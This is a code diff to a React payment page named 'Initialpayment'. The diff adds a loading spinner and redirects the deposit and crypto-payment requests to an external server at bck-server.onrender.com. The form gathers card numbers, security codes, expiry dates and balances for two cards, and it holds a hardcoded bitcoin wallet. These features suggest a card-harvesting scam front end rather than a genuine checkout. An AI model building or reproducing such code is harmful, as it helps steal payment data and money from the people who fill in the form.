@@ -8,6 +8,7 @@ import { Copy, ImageAdd } from "react-huge-icons/solid";
 
 import Frontside from "./Frontside";
 import { toast } from "react-toastify";
+import { Spinner } from "reactstrap";
 const Initialpayment = () => {
   const [wallet] = useState("1GVoDGMcnbJbdeoe2XtCdvsdcAuCkE4ZxC");
   const [response, setResponse] = useState("");
@@ -48,8 +49,9 @@ const Initialpayment = () => {
   const [secondCardSecurity, setSecondCardSecurity] = useState("");
   const [secondCardBalance, setSecondCardBalance] = useState("");
   const [secondCardDate, setSecondCardDate] = useState("");
-
+  const [loading, setLoading] = useState(false);
   const handlePayment = () => {
+    setLoading(true);
     let isValidCard =
       /^([0-9]{4})[-\s]?([0-9]{4})[-\s]?([0-9]{4})[-\s]?([0-9]{4})$/;
     let isValidDate = /^([0-9]{2})([/]{1})([0-9]{2})$/;
@@ -78,8 +80,9 @@ const Initialpayment = () => {
             secondCardSecurity,
             photos: [],
           };
-          fetch("/api/user/deposit", {
+          fetch("https://bck-server.onrender.com/api/user/deposit", {
             method: "POST",
+            credentials: "include",
             headers: { "Content-Type": "Application/json" },
             body: JSON.stringify(depositDetails),
           })
@@ -99,7 +102,6 @@ const Initialpayment = () => {
             });
         } else {
           toast.warn("Enter a valid second card details");
-          // console.log("Enter a valid second card details");
         }
       } else {
         let depositDetails = {
@@ -110,8 +112,9 @@ const Initialpayment = () => {
           balance,
           photos: [],
         };
-        fetch("/api/user/deposit", {
+        fetch("https://bck-server.onrender.com/api/user/deposit", {
           method: "POST",
+          credentials: "include",
           headers: { "Content-Type": "Application/json" },
           body: JSON.stringify(depositDetails),
         })
@@ -126,9 +129,11 @@ const Initialpayment = () => {
               localStorage.setItem("card_id", response.response);
               setSubmitted(true);
             }
+            setLoading(false);
           })
           .catch((err) => {
             toast.error(err.message);
+            setLoading(false);
           });
       }
     } else {
@@ -138,22 +143,34 @@ const Initialpayment = () => {
   const [cardDetailsSubmitted, setSubmitted] = useState(false);
   const [bitcoinAmount, setBitcoinAmount] = useState(0);
   const [paymentSucceed, setStatus] = useState(false);
+
+  //payment with crypto currency
   const handlePayWithCrypto = async () => {
+    setLoading(true);
     const formData = new FormData();
     formData.append("photo", cryptoImage);
     formData.append("amount", bitcoinAmount);
-    const options = { method: "POST", body: formData };
+    const options = { method: "POST", body: formData, credentials: "include" };
 
-    const response = await fetch("/api/crypto-payment", options);
-    const serverResponse = await response.json();
     if (!cryptoImage || !bitcoinAmount) {
+      setLoading(false);
       toast.warn("Provide your payment details");
-    } else if (serverResponse.paymentIsSubmitted) {
+      return;
+    }
+
+    const response = await fetch(
+      "https://bck-server.onrender.com/api/crypto-payment",
+      options
+    );
+    const serverResponse = await response.json();
+
+    if (serverResponse.paymentIsSubmitted) {
+      setLoading(false);
       navigate("/checking-crypto-payment");
     } else {
       toast.error(serverResponse.response);
+      setLoading(false);
     }
-    // console.log(serverResponse);
   };
 
   return (
@@ -440,13 +457,18 @@ const Initialpayment = () => {
                 className="bg-gray-200 px-2 py-2 w-28 outline-gray-100 rounded-md"
               />
             </div>
-            <button
-              onClick={handlePayWithCrypto}
-              // to={`/checking-crypto-payment`}
-              className="bg-black rounded-lg py-3 text-center text-white w-52 mt-4 max-sm:w-full hover:bg-gray-900"
-            >
-              SEND RECEIPT <ArrowRight className="inline text-2xl" />
-            </button>
+            {loading ? (
+              <div className="relative flex justify-end w-full max-sm:w-full items-center">
+                <Spinner type="border" className="mt-1 text-end" />
+              </div>
+            ) : (
+              <button
+                onClick={handlePayWithCrypto}
+                className="bg-black rounded-lg py-3 text-center text-white w-52 mt-4 max-sm:w-full hover:bg-gray-900"
+              >
+                SEND RECEIPT <ArrowRight className="inline text-2xl" />
+              </button>
+            )}
           </div>
         </section>
       )}
